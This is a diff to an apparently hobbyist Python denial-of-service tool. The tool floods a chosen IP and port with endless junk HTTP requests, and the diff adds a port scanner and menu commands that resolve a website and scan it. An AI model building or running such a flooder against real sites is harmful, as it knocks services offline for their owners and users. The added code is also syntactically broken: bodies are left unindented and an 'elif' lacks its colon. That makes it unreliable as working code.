@@ -1,6 +1,25 @@
 import socket
 from threading import Thread
 import os
+import sys
+
+
+def portscanner(targetIP):
+   print(" ")
+   try:
+       for p in range(1, 30):
+       sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+       res = sock.connect_ex((targetIP, p))
+       if res == 0:
+       print("\033[1;32;40mPort: " + str(p))
+       sock.close()
+    except Exception:
+       print("\033[1;32;40mError")
+       sys.exit()
+    print(" ")
+    print("\033[1;32;40mMade by Morpheus youtube")
+    print(" ")
+
 
 
 
@@ -8,6 +27,7 @@ def ddos():
    while True:
       mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       try:
+          print("Success!")
           mysocket.connect((ip, port))
           mysocket.send(str.encode("GET " + "haste mal 3 fufzig" + "HTTP/1.1 \r\n"))
           mysocket.sendto(str.encode("GET " + "haste mal 3 fufzig" + "HTTP/1.1 \r\n"), (ip, port))
@@ -52,6 +72,8 @@ while i < 6:
     set threads = Set the number of threads (set threads) (Best=8) (=!Not working yet!)
     set ip      = Set the ip (set ip)
     get ip      = Get ip of website (get ip)
+    get port w  = Get port of website.
+    get port i  = Get port of ip.
     run         = To Run
     quit        = Quit ; Exit
     
@@ -89,6 +111,12 @@ while i < 6:
       
    elif com == 'run':
       ddos()
+   
+   elif com == 'get port w'
+      print(" ")
+      hbw = raw_input("\033[1;32;40mWebsite: ")
+      hbwtxt = socket.gethostbyname(hbw)
+      portscanner(hbwtxt)
    else:
       print("""
       Error
